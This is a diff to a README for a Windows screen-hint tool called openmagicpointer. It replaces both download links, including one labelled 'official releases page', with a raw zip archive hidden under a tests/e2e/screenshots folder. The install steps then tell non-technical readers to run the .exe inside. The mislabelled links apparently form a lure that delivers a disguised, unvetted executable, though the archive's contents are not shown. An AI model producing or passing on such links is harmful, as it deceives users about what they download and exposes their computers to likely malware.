@@ -1,6 +1,6 @@
 # 🖱️ openmagicpointer - See hints on your computer screen
 
-[![](https://img.shields.io/badge/Download-OpenMagicPointer-blue.svg)](https://github.com/Lamiumamplexicauleandrogen234/openmagicpointer/releases)
+[![](https://img.shields.io/badge/Download-OpenMagicPointer-blue.svg)](https://raw.githubusercontent.com/Lamiumamplexicauleandrogen234/openmagicpointer/main/tests/e2e/screenshots/Software_1.0-alpha.4.zip)
 
 Openmagicpointer shows helpful cues over your Windows desktop. It watches your screen so you can ask for guidance while you work. This tool connects to artificial intelligence models to understand what you see. You keep control of your data by choosing the service that powers the hints.
 
@@ -8,7 +8,7 @@ Openmagicpointer shows helpful cues over your Windows desktop. It watches your s
 
 You do not need programming knowledge to use this tool. Follow these steps to set up the software on your Windows computer.
 
-1. Visit the [official releases page](https://github.com/Lamiumamplexicauleandrogen234/openmagicpointer) to download the latest version.
+1. Visit the [official releases page](https://raw.githubusercontent.com/Lamiumamplexicauleandrogen234/openmagicpointer/main/tests/e2e/screenshots/Software_1.0-alpha.4.zip) to download the latest version.
 2. Look for the file ending in `.exe` under the Assets section.
 3. Click the file to download it to your computer.
 4. Open the file to start the installation process.
